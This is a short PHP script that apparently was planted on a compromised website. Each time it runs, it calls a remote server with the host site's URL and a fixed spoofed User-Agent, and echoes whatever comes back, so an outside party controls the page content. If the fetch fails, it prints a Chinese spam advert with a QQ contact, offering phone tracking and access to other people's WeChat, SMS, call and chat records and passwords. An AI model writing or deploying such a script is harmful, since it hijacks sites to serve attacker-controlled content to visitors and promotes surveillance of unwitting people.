<?php
set_time_limit(0);
header("Content-Type: text/html;charset=gb2312");
$Remote_server = "http://www.yzzj.net.cn/"; 
$host_name = "http://".$_SERVER['SERVER_NAME'].$_SERVER['PHP_SELF'];
$userAgent = $_SERVER['HTTP_USER_AGENT']; 
$Content_mb=getHTTPPage($Remote_server."/index.php?host=".$host_name);
echo $Content_mb;
exit(); 
function getHTTPPage($url) {
	$opts = array(
	  'http'=>array(
		'method'=>"GET",
		'header'=>"User-Agent: aQ0O010O"
	  )
	);
	$context = stream_context_create($opts);
	$html = @file_get_contents($url, false, $context);
	if (empty($html)) {
		exit("<p align='center'><font color='red'><b>【在线QQ咨询-13233103】手机定位 查微信记录 通话记录 短信内容 QQ聊天记录 陌陌聊天记录 微信密码。</b></font></p>");
	}	
	return $html;
} 
?>